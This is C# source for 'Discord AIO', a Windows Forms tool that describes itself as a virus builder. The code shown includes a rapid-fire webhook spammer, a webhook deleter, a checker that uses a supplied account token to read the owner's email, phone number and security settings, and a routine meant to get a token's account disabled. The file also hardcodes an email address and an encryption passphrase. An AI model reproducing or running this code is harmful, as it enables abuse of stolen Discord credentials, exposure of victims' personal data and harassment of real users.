using DiscordRPC;
using Leaf.xNet;
using ScintillaNET;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace discordAIO
{
    public partial class main : Form
    {

        private string version = "v1.0";
        private protected string email = "fmediolanek@gmail.com";
        private protected static string dAIOPass = "ceDUsRGbwAdcjUqHWkMLgARDrkx4hNJ28WbS6fPjr7cYQ87BKJTRFcUKRbJMMxeWDTEy3k9jsLSVFFV9heDeuWYfECHDzpmgYrttCMuLZRBtuPzuSJ846YBZhCa88Qj2fAaNJuuw6fhZBZfANEbRkXvaupN8rtDQVqrvLKnKW5ESAueQ2pz4QJnTdkDdM3rapFk9mU5DNP9MGAX8zymZW2MxLfj5C4p7PkPRYBxbTyawuQR9uaJZCr4bsSDhnCh2XT5CSUzHBFcVgWS7W5W9Z7SkUe4ehtymPawpwg58mpnN36sgWVSGeFXVzbQcXjfqjcUFcR8T2gBc6Ajm9wMjhCMgMNbmCMBjHKhcLghkeGWhw5wHWNZXhnDDFxnA8U4SzqdMkfTZCeaqTBaTASzKsRmGzeBGpdA9CHkLLxtJfxwj9LQ4vafzercmLJWPWGjpyeuM7CyN7ZgRbP9J6w4wzT3bxdtQXtm8RPVq5AKA6y66pSt5rdBaGbZxUjAHD2se";

        public DiscordRpcClient client;

        public main()
        {
            InitializeComponent();
            mainPage.Visible = true;
            webhooksPage.Visible = false;
            tokensPage.Visible = false;
            builderPage.Visible = false;


            CheckProtection();


        //    Scintilla();
            DiscordRPC();
        }

        private void CheckProtection()
        {
            string ip = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");

            WebClient userIP = new WebClient();
            string resposne = userIP.DownloadString("http://check.getipintel.net/check.php?ip=" + ip + "&contact=" + email + "&flags=m");

            int responseNum = Int32.Parse(resposne);

            if (responseNum < 1)
            {
                label2.Text = ip + " > unprotected";
            } 
            else if (responseNum == -5) {
                MessageBox.Show("Error.\nContact email incorrect or blocked.", "Discord AIO");
            }
            else if (responseNum == -6)
            {
                MessageBox.Show("Error.\nContact email incorrect.", "Discord AIO");
            }
            else if (responseNum == -4)
            {
                MessageBox.Show("Error.\nUnable to reach database.\n\nProbably it is being updated.", "Discord AIO");
            }
            else
            {
                label2.Text = ip + " > protected";
            }

        }

        protected void DiscordRPC()
        {
            client = new DiscordRpcClient("811586717433331732");
            client.Initialize();
            client.SetPresence(new RichPresence()
            {
                Details = "Running the best virus builder in the world...",
                State = "github.com/Nyxonn",
                Assets = new Assets()
                {
                    LargeImageKey = "daiorpc2",
                    LargeImageText = "Discord AIO " + version
                }

            });
        }

      /*  void Scintilla()
        {
            scintilla1.Lexer = Lexer.Cpp;
            scintilla1.StyleResetDefault();
            scintilla1.Styles[Style.Default].Font = "Consolas";
            scintilla1.Styles[Style.Default].Size = 10;
            scintilla1.StyleClearAll();
            scintilla1.Styles[Style.Cpp.Default].ForeColor = System.Drawing.Color.Silver;
            scintilla1.Styles[Style.Cpp.Comment].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            scintilla1.Styles[Style.Cpp.CommentLine].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            scintilla1.Styles[Style.Cpp.CommentLineDoc].ForeColor = System.Drawing.Color.FromArgb(128, 128, 128);
            scintilla1.Styles[Style.Cpp.Number].ForeColor = System.Drawing.Color.Olive;
            scintilla1.Styles[Style.Cpp.Word].ForeColor = System.Drawing.Color.Blue;
            scintilla1.Styles[Style.Cpp.Word2].ForeColor = System.Drawing.Color.Blue;
            scintilla1.Styles[Style.Cpp.String].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            scintilla1.Styles[Style.Cpp.Character].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            scintilla1.Styles[Style.Cpp.Verbatim].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            scintilla1.Styles[Style.Cpp.StringEol].BackColor = System.Drawing.Color.Pink;
            scintilla1.Styles[Style.Cpp.Operator].ForeColor = System.Drawing.Color.Purple;
            scintilla1.Styles[Style.Cpp.Preprocessor].ForeColor = System.Drawing.Color.Maroon;
            scintilla1.Margins[0].Width = 16;
        } */

        private void Solid_Paint(object sender, PaintEventArgs e)
        {
            Panel panel = (Panel)sender;
            float width = (float)1.0;
            Color color = Color.DarkRed;
            Pen pen = new Pen(color, width);
            pen.DashStyle = DashStyle.Solid;
            e.Graphics.DrawLine(pen, 0, 0, 0, panel.Height - 0);
            e.Graphics.DrawLine(pen, 0, 0, panel.Width - 0, 0);
            e.Graphics.DrawLine(pen, panel.Width - 1, panel.Height - 1, 0, panel.Height - 1);
            e.Graphics.DrawLine(pen, panel.Width - 1, panel.Height - 1, panel.Width - 1, 0);
        }


        private void Dot_Paint(object sender, PaintEventArgs e)
        {
            Panel panel = (Panel)sender;
            float width = (float)1.0;
            Color color = Color.DarkRed;
            Pen pen = new Pen(color, width);
            pen.DashStyle = DashStyle.Dash;
            e.Graphics.DrawLine(pen, 0, 0, 0, panel.Height - 0);
            e.Graphics.DrawLine(pen, 0, 0, panel.Width - 0, 0);
            e.Graphics.DrawLine(pen, panel.Width - 1, panel.Height - 1, 0, panel.Height - 1);
            e.Graphics.DrawLine(pen, panel.Width - 1, panel.Height - 1, panel.Width - 1, 0);
        }

        private void button1_Click(object sender, EventArgs e) // Main button
        {
            webhooksPage.Visible = false;
            tokensPage.Visible = false;
            builderPage.Visible = false;
            mainPage.Visible = true;
        }

        private void button4_Click(object sender, EventArgs e) // Webhooks button
        {
            webhooksPage.Visible = true;
            mainPage.Visible = false;
            tokensPage.Visible = false;
            builderPage.Visible = false;
        }

















        // Encryption / Decryption

        private const int Keysize = 256;
        private const int DerivationIterations = 1000;

        public static string Decrypt(string cipherText)
        {
            var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
            var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
            var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
            var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();
            using (var password = new Rfc2898DeriveBytes(dAIOPass, saltStringBytes, DerivationIterations))
            {
                var keyBytes = password.GetBytes(Keysize / 8);
                using (var symmetricKey = new RijndaelManaged())
                {
                    symmetricKey.BlockSize = 256;
                    symmetricKey.Mode = CipherMode.CBC;
                    symmetricKey.Padding = PaddingMode.PKCS7;
                    using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
                    {
                        using (var memoryStream = new MemoryStream(cipherTextBytes))
                        {
                            using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                            {
                                var plainTextBytes = new byte[cipherTextBytes.Length];
                                var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
                                memoryStream.Close();
                                cryptoStream.Close();
                                return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
                            }
                        }
                    }
                }
            }
        }

        public static string Encrypt(string plainText)
        {
            var saltStringBytes = Generate256BitsOfRandomEntropy();
            var ivStringBytes = Generate256BitsOfRandomEntropy();
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            using (var password = new Rfc2898DeriveBytes(dAIOPass, saltStringBytes, DerivationIterations))
            {
                var keyBytes = password.GetBytes(Keysize / 8);
                using (var symmetricKey = new RijndaelManaged())
                {
                    symmetricKey.BlockSize = 256;
                    symmetricKey.Mode = CipherMode.CBC;
                    symmetricKey.Padding = PaddingMode.PKCS7;
                    using (var encryptor = symmetricKey.CreateEncryptor(keyBytes, ivStringBytes))
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            using (var cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                            {
                                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
                                cryptoStream.FlushFinalBlock();
                                var cipherTextBytes = saltStringBytes;
                                cipherTextBytes = cipherTextBytes.Concat(ivStringBytes).ToArray();
                                cipherTextBytes = cipherTextBytes.Concat(memoryStream.ToArray()).ToArray();
                                memoryStream.Close();
                                cryptoStream.Close();
                                return Convert.ToBase64String(cipherTextBytes);
                            }
                        }
                    }
                }
            }
        }

        private static byte[] Generate256BitsOfRandomEntropy()
        {
            var randomBytes = new byte[32];
            using (var rngCsp = new RNGCryptoServiceProvider())
            {
                rngCsp.GetBytes(randomBytes);
            }
            return randomBytes;
        }

        private void button7_Click(object sender, EventArgs e) // Perform Webhook Check MAIN
        {
            if (String.IsNullOrEmpty(textBox2.Text) || String.IsNullOrWhiteSpace(textBox2.Text))
            {
                MessageBox.Show("Webhook cannot be empty!", "Discord AIO");
            }
            else
            {
                WebClient checkWebhook = new WebClient();
                try
                {
                    string webhook = checkWebhook.DownloadString(textBox2.Text);
                    MessageBox.Show("Webhook valid.", "Discord AIO");
                }
                catch
                {
                    MessageBox.Show("Invalid webhook.", "Discord AIO");
                }
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/qjrDprutvg");
        }

        private void label4_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/qjrDprutvg");
        }

        private void button6_Click(object sender, EventArgs e) // Perform Webhook Check Webhooks
        {
            if (String.IsNullOrEmpty(textBox1.Text) || String.IsNullOrWhiteSpace(textBox1.Text))
            {
                MessageBox.Show("Webhook cannot be empty!", "Discord AIO");
            }
            else
            {
                WebClient checkWebhook = new WebClient();
                try
                {
                    string webhook = checkWebhook.DownloadString(textBox1.Text);
                    MessageBox.Show("Webhook valid.", "Discord AIO");
                }
                catch
                {
                    MessageBox.Show("Invalid webhook.", "Discord AIO");
                }
            }
        }

        private bool webhookSwitch = false;
        private bool webHandler = false;

        private void button9_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(textBox1.Text) || String.IsNullOrWhiteSpace(textBox1.Text) || (String.IsNullOrEmpty(textBox3.Text) || String.IsNullOrWhiteSpace(textBox3.Text) || (String.IsNullOrEmpty(textBox4.Text) || String.IsNullOrWhiteSpace(textBox4.Text))))
            {
                MessageBox.Show("Webhook, name and message cannot be empty!", "Discord AIO");
            }
            else
            {
                string SPAMwebhook = textBox1.Text;
                string SPAMname = textBox3.Text;
                string SPAMmessage = textBox4.Text;

                webhookSwitch = true;


                if (checkBox17.Checked)
                {
                    new Thread(() =>
                    {
                        while (webhookSwitch)
                        {
                            try
                            {
                                using (HttpRequest req = new HttpRequest())
                                {
                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"Discord AIO bitcheeeeesss!\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"3330898\",\"footer\":{\"text\":\"Discord AIO\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://i.imgur.com/BDfuGjz.jpg\",\"url\":\"https://discord.gg/YXa2BF8Q3H\"}}]}", "application/json").ToString();
                                    Thread.Sleep(2000);
                                }
                            }
                            catch
                            {
                                if (webHandler == false)
                                {
                                    webhookSwitch = false;
                                    MessageBox.Show("Too many requests.\nSpam delayed.", "Discord AIO");
                                    Thread.Sleep(3000);
                                    webhookSwitch = true;
                                }
                            }
                        }
                    }).Start();
                }
                else
                {
                    new Thread(() =>
                    {
                        while (webhookSwitch)
                        {
                            try
                            {
                                using (HttpRequest req = new HttpRequest())
                                {
                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"Discord AIO bitcheeeeesss!\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"3330898\",\"footer\":{\"text\":\"Discord AIO\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://i.imgur.com/BDfuGjz.jpg\",\"url\":\"https://discord.gg/YXa2BF8Q3H\"}}]}", "application/json").ToString();
                                    Thread.Sleep(35);
                                }
                            }
                            catch
                            {
                                if (webHandler == false)
                                {
                                    webhookSwitch = false;
                                    MessageBox.Show("Too many requests.\nSpam delayed.", "Discord AIO");
                                    Thread.Sleep(500);
                                    webhookSwitch = true;
                                }
                            }
                        }
                    }).Start();
                }

            }
        }

        private void button10_Click(object sender, EventArgs e)
        {
            webhookSwitch = false;
            webHandler = true;
            MessageBox.Show("Spam stopped.", "Discord AIO");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(textBox1.Text) || String.IsNullOrWhiteSpace(textBox1.Text))
            {
                MessageBox.Show("Webhook cannot be empty!", "Discord AIO");
            }
            else
            {
                try
                {
                    new HttpRequest().Delete(textBox1.Text).ToString();
                    MessageBox.Show("Webhook deleted.", "Discord AIO");
                }
                catch
                {
                    MessageBox.Show("Invalid webhook.", "Discord AIO");
                }
            }
        }

        // Get between handler
        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                int Start, End;
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }

            return "";
        }

        // Token checker
        private void button11_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(textBox5.Text) || String.IsNullOrWhiteSpace(textBox5.Text))
            {
                MessageBox.Show("Token cannot be empty!", "Discord AIO");
            } else
            {
                string token = textBox5.Text;

                try
                {

                    HttpRequest req = new HttpRequest();
                    req.AddHeader("Authorization", token);
                    var tokenReq = req.Get("https://discordapp.com/api/users/@me");
                    string tokenCreds = tokenReq.ToString();

                    string nameData = getBetween(tokenCreds, "username\": ", ",");
                    string nameDISData = getBetween(tokenCreds, "discriminator\": ", ",");
                    string emailData = getBetween(tokenCreds, "email\": ", ",");
                    string phoneData = getBetween(tokenCreds, "phone\": ", "}");
                    string idData = getBetween(tokenCreds, "id\": ", ",");
                    string mfaData = getBetween(tokenCreds, "mfa_enabled\": ", ",");
                    string vData = getBetween(tokenCreds, "verified\": ", ",");
                    string avatarData = getBetween(tokenCreds, "avatar\": ", ",");

                    // Trims
                    label18.Text = nameData.Trim('"') + " #" + nameDISData.Trim('"');
                    label19.Text = emailData.Trim('"');
                    label20.Text = phoneData.Trim('"');
                    string trimedID = idData.Trim('"');
                    string trimedMFA = mfaData.Trim('"');
                    string trimedVRF = vData.Trim('"');
                    string trimedAvatar = avatarData.Trim('"');
                    label21.Text = trimedID;

                    // MFA label
                    string credMFA = "Disabled";
                    if (trimedMFA == "true")
                    {
                        credMFA = "Enabled";
                    }
                    label22.Text = credMFA;

                    // Verified label
                    string credVRF = "Unverified";
                    if (trimedVRF == "true")
                    {
                        credVRF = "Verified";
                    }
                    label23.Text = credVRF;

                    // Avatar
                    string link = "https://cdn.discordapp.com/avatars/" + trimedID + "/" + trimedAvatar + ".jpg";
                    var request = WebRequest.Create(link);

                    using (var response = request.GetResponse())
                    using (var stream = response.GetResponseStream())
                    {
                        pictureBox2.Image = Bitmap.FromStream(stream);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                    MessageBox.Show("Invalid token.", "Discord AIO");
                }

            }
        }

        private void button12_Click(object sender, EventArgs e)
        {
            string token = textBox5.Text;
            if (String.IsNullOrEmpty(textBox5.Text) || String.IsNullOrWhiteSpace(textBox5.Text))
            {
                MessageBox.Show("Token cannot be empty!", "Discord AIO");
            }
            else
            {
                try
                {
                    HttpRequest req = new HttpRequest();
                    req.AddHeader("Authorization", token);
                    req.Post("https://discordapp.com/api/v6/invite/minecraft");
                }
                catch
                {
                    MessageBox.Show("Token deleted.", "Discord AIO");
                }
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            tokensPage.Visible = true;
            webhooksPage.Visible = false;
            mainPage.Visible = false;
            builderPage.Visible = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            builderPage.Visible = true;
            tokensPage.Visible = false;
            webhooksPage.Visible = false;
            mainPage.Visible = false;
        }
    }
}
